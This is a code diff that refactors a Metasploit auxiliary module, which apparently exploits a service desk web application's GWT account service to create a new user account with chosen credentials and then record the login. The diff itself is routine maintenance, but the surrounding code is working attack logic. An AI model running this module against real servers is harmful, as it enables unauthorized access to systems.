@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -42,7 +39,7 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('USERNAME', [true, 'Username for the new account', 'msf']),
         OptString.new('PASSWORD', [true, 'Password for the new account', 'p4ssw0rd'])
-      ], self.class)
+      ])
   end
 
   def get_service_desk_strong_name
@@ -73,21 +70,21 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
 
-    print_status("#{peer} - Trying to find the service desk service strong name...")
+    print_status("Trying to find the service desk service strong name...")
     service_desk = get_service_desk_strong_name
     if service_desk.nil?
-      print_error("#{peer} - service desk service not found.")
+      print_error("service desk service not found.")
       return
     end
-    print_good("#{peer} - service desk strong number found: #{service_desk}")
+    print_good("service desk strong number found: #{service_desk}")
 
-    print_status("#{peer} - Trying to find the AccountService strong name...")
+    print_status("Trying to find the AccountService strong name...")
     account_service = get_account_service_strong_name(service_desk)
     if account_service.nil?
-      print_error("#{peer} - AccountService service not found.")
+      print_error("AccountService service not found.")
       return
     end
-    print_good("#{peer} - AccountService strong number found: #{account_service}")
+    print_good("AccountService strong number found: #{account_service}")
 
     header= "6|0|39" # version | unknown | string_table size
 
@@ -208,7 +205,7 @@ class Metasploit3 < Msf::Auxiliary
     service_url = ssl ? "https://" : "http://"
     service_url << "#{rhost}:#{rport}/servicedesk/servicedesk/"
 
-    print_status("#{peer} - Trying to create account #{datastore["USERNAME"]}...")
+    print_status("Trying to create account #{datastore["USERNAME"]}...")
     res = send_request_cgi({
       'method' => 'POST',
       'uri'    => normalize_uri("servicedesk", "servicedesk", "accountSerivce.gwtsvc"),
@@ -221,29 +218,30 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     unless res and res.code == 200
-      print_error("#{peer} - Unknown error while creating the user.")
+      print_error("Unknown error while creating the user.")
       return
     end
 
     if res.body =~ /Username.*already exists/
-      print_error("#{peer} - The user #{datastore["USERNAME"]} already exists.")
+      print_error("The user #{datastore["USERNAME"]} already exists.")
       return
     elsif res.body =~ /Account.*added successfully/
       login_url = ssl ? "https://" : "http://"
       login_url << "#{rhost}:#{rport}/servicedesk/ServiceDesk.jsp"
 
-      report_auth_info({
-        :host => rhost,
-        :port => rport,
-        :user => datastore["USERNAME"],
-        :pass => datastore["PASSWORD"],
-        :type => "password",
-        :sname => (ssl ? "https" : "http"),
-        :proof => "#{login_url}\n#{res.body}"
-      })
-      print_good("#{peer} - Account #{datastore["USERNAME"]}/#{datastore["PASSWORD"]} created successfully.")
-      print_status("#{peer} - Use it to log into #{login_url}")
+      connection_details = {
+          module_fullname: self.fullname,
+          username: datastore['USERNAME'],
+          private_data: datastore['PASSWORD'],
+          private_type: :password,
+          workspace_id: myworkspace_id,
+          proof: "#{login_url}\n#{res.body}",
+          status: Metasploit::Model::Login::Status::UNTRIED
+      }.merge(service_details)
+      create_credential_and_login(connection_details)
+
+      print_good("Account #{datastore["USERNAME"]}/#{datastore["PASSWORD"]} created successfully.")
+      print_status("Use it to log into #{login_url}")
     end
   end
-
 end
